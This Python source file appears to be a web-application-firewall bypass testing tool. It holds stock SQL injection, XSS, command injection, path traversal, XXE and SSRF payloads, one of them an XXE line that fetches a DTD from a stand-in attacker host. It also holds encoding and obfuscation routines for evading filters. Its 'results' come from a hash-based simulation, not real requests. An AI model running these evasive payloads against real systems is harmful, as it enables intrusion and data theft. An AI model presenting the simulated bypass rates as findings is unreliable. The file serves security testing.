import asyncio
import time
import re
import urllib.parse
import base64
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from schemas import (
    WAFBypassRequest, WAFBypassResponse, WAFBypassPayload, 
    WAFBypassTechnique
)

# Tool metadata
TOOL_INFO = {
    "name": "web_application_firewall_bypass",
    "display_name": "WAF Bypass Tester",
    "description": "Tests various techniques to bypass Web Application Firewall (WAF) protections",
    "category": "web_security",
    "author": "Wildbox Security",
    "version": "1.0.0",
    "input_schema": WAFBypassRequest.model_json_schema(),
    "output_schema": WAFBypassResponse.model_json_schema(),
    "requires_api_key": False,
    "rate_limit": {
        "requests_per_minute": 10,
        "requests_per_hour": 100
    }
}

class WAFBypassTester:
    """Web Application Firewall Bypass Tester"""
    
    def __init__(self):
        self.base_payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "1; DROP TABLE users--",
                "' UNION SELECT * FROM users--",
                "admin'--",
                "' OR 1=1#"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd"
            ],
            "xxe": [
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'> %xxe;]>"
            ],
            "ssrf": [
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://localhost:80/"
            ]
        }
        
        self.waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "akamai": ["akamai", "ak-bmzi", "ak-bmsc"],
            "aws_waf": ["x-amzn-", "awselb"],
            "f5_bigip": ["bigipserver", "f5-bigip", "tmm"],
            "imperva": ["incap_ses", "visid_incap", "imperva"],
            "sucuri": ["sucuri", "x-sucuri"],
            "modsecurity": ["mod_security", "modsec"]
        }
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload"""
        if encoding == "url_encoding":
            return urllib.parse.quote(payload, safe='')
        elif encoding == "html_encoding":
            return ''.join(f'&#x{ord(c):x};' for c in payload)
        elif encoding == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        else:
            return payload
    
    def _obfuscate_payload(self, payload: str, method: str) -> str:
        """Apply obfuscation to payload"""
        if method == "case_variation":
            # Randomly vary case
            result = ""
            for i, char in enumerate(payload):
                if char.isalpha():
                    result += char.upper() if i % 2 == 0 else char.lower()
                else:
                    result += char
            return result
        
        elif method == "comment_insertion":
            # Insert SQL/HTML comments
            if "SELECT" in payload.upper():
                return payload.replace("SELECT", "SEL/**/ECT")
            elif "<script>" in payload.lower():
                return payload.replace("<script>", "<scr<!---->ipt>")
            else:
                return payload
        
        elif method == "whitespace_manipulation":
            # Use alternative whitespace characters
            return payload.replace(" ", "\t").replace(" ", "%20")
        
        elif method == "concatenation":
            # Use string concatenation
            if "'" in payload:
                return payload.replace("'1'='1'", "'1'='1'")
            else:
                return payload
        
        else:
            return payload
    
    def _detect_waf(self, response_headers: Dict[str, str], 
                   response_body: str) -> Tuple[bool, Optional[str]]:
        """Detect WAF based on response headers and body"""
        headers_str = str(response_headers).lower()
        body_str = response_body.lower()
        
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if signature.lower() in headers_str or signature.lower() in body_str:
                    return True, waf_name
        
        # Generic WAF detection patterns
        waf_patterns = [
            "access denied", "blocked", "forbidden", "security violation",
            "waf", "firewall", "protection", "threat detected"
        ]
        
        for pattern in waf_patterns:
            if pattern in body_str:
                return True, "unknown"
        
        return False, None
    
    def _simulate_request(self, url: str, payload: str, 
                         headers: Optional[Dict[str, str]] = None) -> Dict:
        """Simulate HTTP request and response"""
        # Simulate response based on payload characteristics
        payload_lower = payload.lower()
        
        # Determine if WAF would trigger
        waf_triggered = False
        response_code = 200
        
        # Basic WAF rules simulation
        suspicious_patterns = [
            "script", "union", "select", "drop", "insert", "update",
            "delete", "exec", "eval", "alert", "onload", "onerror",
            "../", "etc/passwd", "system32", "cmd.exe"
        ]
        
        # Check for obvious attack patterns
        for pattern in suspicious_patterns:
            if pattern in payload_lower:
                # Simulate WAF detection based on encoding/obfuscation
                detection_probability = 0.8
                
                # Reduce detection for encoded payloads
                if "%3c" in payload or "&#x" in payload or "\\u" in payload:
                    detection_probability *= 0.6
                
                # Reduce detection for obfuscated payloads
                if "/**/" in payload or "<!---->" in payload:
                    detection_probability *= 0.7
                
                if hash(payload) % 100 < detection_probability * 100:
                    waf_triggered = True
                    response_code = 403
                    break
        
        # Simulate response
        response_size = 1500 + (hash(payload) % 5000)
        
        # Simulate headers
        simulated_headers = {
            "server": "nginx/1.18.0",
            "content-type": "text/html",
            "content-length": str(response_size)
        }
        
        # Add WAF headers if triggered
        if waf_triggered:
            waf_type = list(self.waf_signatures.keys())[hash(url) % len(self.waf_signatures)]
            if waf_type == "cloudflare":
                simulated_headers["cf-ray"] = "abc123-SJC"
                simulated_headers["server"] = "cloudflare"
            elif waf_type == "akamai":
                simulated_headers["server"] = "AkamaiGHost"
        
        # Simulate response body
        if waf_triggered:
            response_body = "<html><body><h1>Access Denied</h1><p>Security violation detected.</p></body></html>"
        else:
            response_body = "<html><body><h1>Welcome</h1><p>Request processed successfully.</p></body></html>"
        
        return {
            "status_code": response_code,
            "headers": simulated_headers,
            "body": response_body,
            "size": response_size
        }
    
    def _generate_technique_stats(self, payloads: List[WAFBypassPayload]) -> List[WAFBypassTechnique]:
        """Generate statistics for each technique"""
        techniques = {}
        
        for payload in payloads:
            technique_key = f"{payload.technique}_{payload.encoding}_{payload.obfuscation}"
            
            if technique_key not in techniques:
                techniques[technique_key] = {
                    "name": f"{payload.technique} + {payload.encoding} + {payload.obfuscation}",
                    "description": f"Combines {payload.technique} with {payload.encoding} encoding and {payload.obfuscation} obfuscation",
                    "total": 0,
                    "successful": 0,
                    "examples": []
                }
            
            techniques[technique_key]["total"] += 1
            if payload.bypass_success:
                techniques[technique_key]["successful"] += 1
                techniques[technique_key]["examples"].append(payload.modified_payload)
        
        result = []
        for tech_data in techniques.values():
            success_rate = tech_data["successful"] / tech_data["total"] if tech_data["total"] > 0 else 0
            
            recommendations = []
            if success_rate > 0.7:
                recommendations.append("Highly effective technique - update WAF rules")
            elif success_rate > 0.3:
                recommendations.append("Moderately effective - consider additional filtering")
            else:
                recommendations.append("Low effectiveness - current defenses adequate")
            
            result.append(WAFBypassTechnique(
                name=tech_data["name"],
                description=tech_data["description"],
                success_rate=success_rate,
                payloads_tested=tech_data["total"],
                payloads_successful=tech_data["successful"],
                examples=tech_data["examples"][:3],  # Top 3 examples
                recommendations=recommendations
            ))
        
        return sorted(result, key=lambda x: x.success_rate, reverse=True)
    
    def _assess_risk_level(self, bypass_rate: float, successful_bypasses: int) -> str:
        """Assess overall risk level"""
        if bypass_rate > 0.7 and successful_bypasses > 10:
            return "Critical"
        elif bypass_rate > 0.5 and successful_bypasses > 5:
            return "High"
        elif bypass_rate > 0.3 and successful_bypasses > 2:
            return "Medium"
        elif bypass_rate > 0.1:
            return "Low"
        else:
            return "Minimal"
    
    def _generate_recommendations(self, techniques: List[WAFBypassTechnique], 
                                waf_detected: bool) -> List[str]:
        """Generate bypass recommendations for pentesters"""
        recommendations = []
        
        if not waf_detected:
            recommendations.append("No WAF detected - consider direct attack approaches")
            return recommendations
        
        effective_techniques = [t for t in techniques if t.success_rate > 0.3]
        
        if effective_techniques:
            best_technique = effective_techniques[0]
            recommendations.append(f"Most effective technique: {best_technique.name}")
            
            if "encoding" in best_technique.name.lower():
                recommendations.append("Focus on encoding-based bypasses")
            
            if "obfuscation" in best_technique.name.lower():
                recommendations.append("Utilize payload obfuscation methods")
        
        recommendations.extend([
            "Try alternative HTTP methods (PUT, PATCH, OPTIONS)",
            "Test with different Content-Type headers",
            "Experiment with HTTP parameter pollution",
            "Consider using HTTPS vs HTTP protocol differences",
            "Test payload fragmentation across multiple parameters"
        ])
        
        return recommendations
    
    def _generate_waf_improvements(self, techniques: List[WAFBypassTechnique]) -> List[str]:
        """Generate WAF improvement suggestions"""
        improvements = []
        
        effective_techniques = [t for t in techniques if t.success_rate > 0.3]
        
        if effective_techniques:
            improvements.append("Update WAF rules to handle the following bypass techniques:")
            for technique in effective_techniques[:3]:
                improvements.append(f"- Improve detection for {technique.name.lower()}")
        
        improvements.extend([
            "Implement rate limiting for suspicious requests",
            "Add behavioral analysis for attack pattern detection",
            "Enable logging and monitoring for bypass attempts",
            "Regularly update WAF rule sets and signatures",
            "Consider implementing CAPTCHA for suspicious traffic",
            "Deploy multiple WAF layers for defense in depth"
        ])
        
        return improvements

async def execute_tool(request: WAFBypassRequest) -> WAFBypassResponse:
    """Execute WAF bypass testing"""
    start_time = time.time()
    
    tester = WAFBypassTester()
    payload_results = []
    
    # Test different combinations of payloads, encodings, and obfuscations
    for payload_type in request.payload_types:
        if payload_type not in tester.base_payloads:
            continue
            
        for base_payload in tester.base_payloads[payload_type]:
            for encoding in request.encoding_techniques:
                for obfuscation in request.obfuscation_methods:
                    # Apply encoding and obfuscation
                    modified_payload = tester._encode_payload(base_payload, encoding)
                    modified_payload = tester._obfuscate_payload(modified_payload, obfuscation)
                    
                    # Simulate request
                    response = tester._simulate_request(
                        request.target_url, 
                        modified_payload, 
                        request.custom_headers
                    )
                    
                    # Detect WAF
                    waf_triggered, _ = tester._detect_waf(
                        response["headers"], 
                        response["body"]
                    )
                    
                    # Determine bypass success
                    bypass_success = response["status_code"] == 200 and not waf_triggered
                    
                    # Extract detection signatures
                    detection_signatures = []
                    if waf_triggered:
                        for waf_name, signatures in tester.waf_signatures.items():
                            for sig in signatures:
                                if sig.lower() in str(response["headers"]).lower():
                                    detection_signatures.append(f"{waf_name}:{sig}")
                    
                    payload_results.append(WAFBypassPayload(
                        original_payload=base_payload,
                        modified_payload=modified_payload,
                        technique=payload_type,
                        encoding=encoding,
                        obfuscation=obfuscation,
                        bypass_success=bypass_success,
                        response_code=response["status_code"],
                        response_size=response["size"],
                        waf_triggered=waf_triggered,
                        detection_signatures=detection_signatures
                    ))
                    
                    # Add delay to simulate real testing
                    await asyncio.sleep(0.01)
    
    # Analyze results
    successful_bypasses = sum(1 for p in payload_results if p.bypass_success)
    total_payloads = len(payload_results)
    bypass_rate = successful_bypasses / total_payloads if total_payloads > 0 else 0
    
    # Detect WAF from initial request
    initial_response = tester._simulate_request(request.target_url, "test")
    waf_detected, waf_type = tester._detect_waf(
        initial_response["headers"], 
        initial_response["body"]
    )
    
    # Generate technique statistics
    techniques_tested = tester._generate_technique_stats(payload_results)
    most_effective = techniques_tested[0].name if techniques_tested else None
    
    # Generate analysis patterns
    blocked_patterns = list(set([
        p.original_payload for p in payload_results 
        if p.waf_triggered and not p.bypass_success
    ]))[:10]
    
    allowed_patterns = list(set([
        p.modified_payload for p in payload_results 
        if p.bypass_success
    ]))[:10]
    
    # Risk assessment
    risk_level = tester._assess_risk_level(bypass_rate, successful_bypasses)
    
    vulnerability_summary = f"WAF bypass success rate: {bypass_rate:.1%}. "
    if risk_level in ["Critical", "High"]:
        vulnerability_summary += "Significant bypass vulnerabilities detected."
    elif risk_level == "Medium":
        vulnerability_summary += "Moderate bypass potential identified."
    else:
        vulnerability_summary += "WAF protection appears effective."
    
    # Generate recommendations
    bypass_recommendations = tester._generate_recommendations(techniques_tested, waf_detected)
    waf_improvements = tester._generate_waf_improvements(techniques_tested)
    
    processing_time = int((time.time() - start_time) * 1000)
    
    return WAFBypassResponse(
        target_url=request.target_url,
        waf_detected=waf_detected,
        waf_type=waf_type,
        waf_version=None,  # Would need specific detection logic
        total_payloads_tested=total_payloads,
        successful_bypasses=successful_bypasses,
        bypass_success_rate=bypass_rate,
        techniques_tested=techniques_tested,
        most_effective_technique=most_effective,
        payload_results=payload_results[:50],  # Limit results
        blocked_patterns=blocked_patterns,
        allowed_patterns=allowed_patterns,
        filtering_rules=[
            "SQL injection pattern detection",
            "XSS script tag filtering",
            "Command injection prevention",
            "Path traversal blocking"
        ],
        risk_level=risk_level,
        vulnerability_summary=vulnerability_summary,
        bypass_recommendations=bypass_recommendations,
        waf_improvement_suggestions=waf_improvements,
        timestamp=datetime.now().isoformat(),
        processing_time_ms=processing_time
    )
